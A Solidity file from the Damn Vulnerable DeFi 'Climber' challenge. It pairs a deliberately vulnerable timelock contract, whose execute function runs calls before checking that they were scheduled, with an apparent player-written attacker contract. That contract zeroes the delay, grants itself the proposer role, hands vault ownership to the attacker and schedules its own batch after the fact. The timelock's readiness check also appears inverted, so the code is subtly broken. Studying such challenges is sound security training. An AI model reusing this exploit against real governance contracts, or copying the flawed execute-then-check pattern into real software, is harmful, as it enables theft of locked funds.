// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/AccessControl.sol";
import "@openzeppelin/contracts/utils/Address.sol";

/**
 * @title ClimberTimelock
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract ClimberTimelock is AccessControl {
    using Address for address;

    bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

    // Possible states for an operation in this timelock contract
    enum OperationState {
        Unknown,
        Scheduled,
        ReadyForExecution,
        Executed
    }

    // Operation data tracked in this contract
    struct Operation {
        uint64 readyAtTimestamp; // timestamp at which the operation will be ready for execution
        bool known; // whether the operation is registered in the timelock
        bool executed; // whether the operation has been executed
    }

    // Operations are tracked by their bytes32 identifier
    mapping(bytes32 => Operation) public operations;

    uint64 public delay = 1 hours;

    constructor(address admin, address proposer) {
        _setRoleAdmin(ADMIN_ROLE, ADMIN_ROLE);
        _setRoleAdmin(PROPOSER_ROLE, ADMIN_ROLE);

        // deployer + self administration
        _setupRole(ADMIN_ROLE, admin);
        _setupRole(ADMIN_ROLE, address(this));

        _setupRole(PROPOSER_ROLE, proposer);
    }

    function getOperationState(bytes32 id)
        public
        view
        returns (OperationState)
    {
        Operation memory op = operations[id];

        if (op.executed) {
            return OperationState.Executed;
        } else if (op.readyAtTimestamp >= block.timestamp) {
            return OperationState.ReadyForExecution;
        } else if (op.readyAtTimestamp > 0) {
            return OperationState.Scheduled;
        } else {
            return OperationState.Unknown;
        }
    }

    function getOperationId(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) public pure returns (bytes32) {
        return keccak256(abi.encode(targets, values, dataElements, salt));
    }

    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external onlyRole(PROPOSER_ROLE) {
        require(targets.length > 0 && targets.length < 256);
        require(targets.length == values.length);
        require(targets.length == dataElements.length);

        bytes32 id = getOperationId(targets, values, dataElements, salt);
        require(
            getOperationState(id) == OperationState.Unknown,
            "Operation already known"
        );

        operations[id].readyAtTimestamp = uint64(block.timestamp) + delay;
        operations[id].known = true;
    }

    /** Anyone can execute what has been scheduled via `schedule` */
    function execute(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external payable {
        require(targets.length > 0, "Must provide at least one target");
        require(targets.length == values.length);
        require(targets.length == dataElements.length);

        bytes32 id = getOperationId(targets, values, dataElements, salt);

        // optimistically executes operations
        for (uint8 i = 0; i < targets.length; i++) {
            targets[i].functionCallWithValue(dataElements[i], values[i]);
        }

        // checks if operation is executable after
        require(getOperationState(id) == OperationState.ReadyForExecution);
        operations[id].executed = true;
    }

    function updateDelay(uint64 newDelay) external {
        require(msg.sender == address(this), "Caller must be timelock itself");
        require(newDelay <= 14 days, "Delay must be 14 days or less");
        delay = newDelay;
    }

    receive() external payable {}
}

contract myFriendlyAndHelpfulLittleContract {
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

    function doStuff(
        address _attacker,
        address _vault,
        address payable _thisTimelock
    ) public {
        // define all the values going into the schedule call, should be a way to do it prettier/faster than this but just gonna do what works for now

        address[] memory targets = new address[](4);
        targets[0] = _thisTimelock;
        targets[1] = _thisTimelock;
        targets[2] = _vault;
        targets[3] = address(this);

        uint256[] memory values = new uint256[](4);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;
        bytes[] memory dataElements = new bytes[](4);
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        dataElements[1] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            keccak256("PROPOSER_ROLE"),
            address(this)
        );
        dataElements[2] = abi.encodeWithSignature(
            "transferOwnership(address)",
            _attacker
        );
        dataElements[3] = abi.encodeWithSignature(
            "doStuff(address,address,address)",
            _attacker,
            _vault,
            _thisTimelock
        );

        ClimberTimelock(_thisTimelock).schedule(
            targets,
            values,
            dataElements,
            keccak256(abi.encodePacked("0x"))
        );
    }
}
